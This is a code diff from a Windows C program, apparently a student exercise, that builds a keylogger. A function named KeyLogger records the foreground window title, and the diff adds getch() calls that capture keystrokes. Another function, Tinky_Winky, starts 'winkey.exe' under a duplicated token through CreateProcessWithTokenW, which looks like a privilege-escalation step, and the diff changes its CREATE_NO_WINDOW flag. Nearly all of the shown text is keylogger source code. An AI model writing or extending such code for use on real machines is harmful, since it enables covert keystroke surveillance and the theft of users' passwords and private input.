@@ -6,6 +6,7 @@
 #include <psapi.h>
 #include <string>
 #include <time.h>
+#include <conio.h>
 
 
 
@@ -52,7 +53,7 @@ void    Tinky_Winky() {
     strcat(Path, "\\winkey.exe 1337");
     int i = 0;
 
-    if (!CreateProcessWithTokenW(newExecToken, LOGON_WITH_PROFILE, PP, NULL, CREATE_NO_WINDOW, NULL, NULL, NULL, &winkeyPI)) {
+    if (!CreateProcessWithTokenW(newExecToken, LOGON_WITH_PROFILE, PP, NULL, NULL, NULL, NULL, NULL, &winkeyPI)) {
         printf("cpwt (%d)\n", GetLastError());
     }
 }
@@ -71,6 +72,7 @@ void    KeyLogger() {
     HWND currWindow;
     char title[256];
     char* timebuf;
+    char ch;
     timebuf = (char*)malloc(sizeof(char) * 80);
     while (1) {
         currWindow = GetForegroundWindow();
@@ -78,7 +80,11 @@ void    KeyLogger() {
         getTime(&timebuf);
         printf("[ %s ] - ", timebuf);
         printf(" '%s'\n", title);
+        ch = getch();
+        printf("%c", ch);
         while (currWindow == GetForegroundWindow()){
+            ch = getch();
+            printf("%c", ch);
             ///key hooks
 
         }
